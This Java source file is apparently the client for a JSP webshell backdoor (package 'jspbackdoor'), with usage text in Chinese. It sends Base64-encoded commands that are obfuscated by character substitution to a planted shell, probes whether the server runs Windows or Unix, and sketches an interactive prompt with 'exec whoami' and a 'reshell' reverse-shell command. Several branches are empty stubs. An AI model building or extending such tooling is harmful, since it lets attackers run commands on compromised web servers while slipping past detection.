package com.weiwhy.jspbackdoor;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.Base64.Encoder;

public class Main {

	/*
	 * java -jar http://localhost/a.jsp password @#$^ AxMe
	 * java -jar http://localhost/a.jsp 密码		 key  word
	 */
	public static String cmd;
	public static String url;
	public static String pass;
	public static String key;
	public static String words;
	public static void main(String[] args) {
		
		Encoder encoder=Base64.getEncoder();
		if (args.length==0) {
			System.out.println("use age:");
			System.out.println("java -jar client.jar http://localhost/a.jsp 密码   key words");
			System.out.println("密码为shell的密码,key取值为（!@#$%^<>~?）,words为和key同等长度的（A-Za-z）");
			System.out.println("java -jar client.jar g key words");
			System.out.println("构造shell,满足key长度等于words");
			return;
		}
		switch (args[0]) {
		case "g":
			//等待开发种
			if (args.length==3) {
				
			}else {
				System.out.println("构造webshell");
				System.out.println("java -jar client.jar g key words");
			}
			break;
		default:
			url=args[0];
			pass=args[1];
			key=args[2];
			words=args[3];
			if (key.length()!=words.length()) {
				return;
			}
			cmd=Util.Readtext("cmd");
			String win=cmd.replace("%cmd%", "cmd /c echo ok");
			String unix=cmd.replace("%cmd%", "sh -c 'echo ok'");
			String win_de=new String(encoder.encode(win.getBytes()));
			String unix_de=new String(encoder.encode(unix.getBytes()));
			for (int i = 0; i <key.length(); i++) {
				win_de=win_de.replace(words.substring(i,i+1), key.substring(i,i+1));
			}
			for (int i = 0; i < key.length(); i++) {
				unix_de=unix_de.replace(words.substring(i,i+1), key.substring(i,i+1));
			}
			
			if (Util.GetStatuscode(pass,url, win_de, key, words)==200) {
				System.out.println("win");
				
			}else if (Util.GetStatuscode(pass,url, unix_de, key, words)==200) {
				System.out.println("unix");
				
			}else {
				System.out.println("执行失败");
			}
			
			break;
		}	
	}
	public static void DoHome(String pfm) {
		System.out.print("shell$");
		
		Scanner scanner=new Scanner(System.in);
		List<String> list=new ArrayList<String>();
		String input=scanner.nextLine();
		String[] inputs=input.split(" ");
		for (int i = 0; i < inputs.length; i++) {
			list.add(inputs[i]);
		}
		switch (list.get(0)) {
		case "exec":
			if (list.size()==2) {
				
			}else {
				System.out.println("exec whoami");
			}
			break;
		case  "reshell":
			if (list.size()==3) {
				
			}else {
				System.out.println("reshell 1.1.1.1 8889");
			}
			break;
		case "tgcd":
			
			break;
		default:
			break;
		}
	}

}
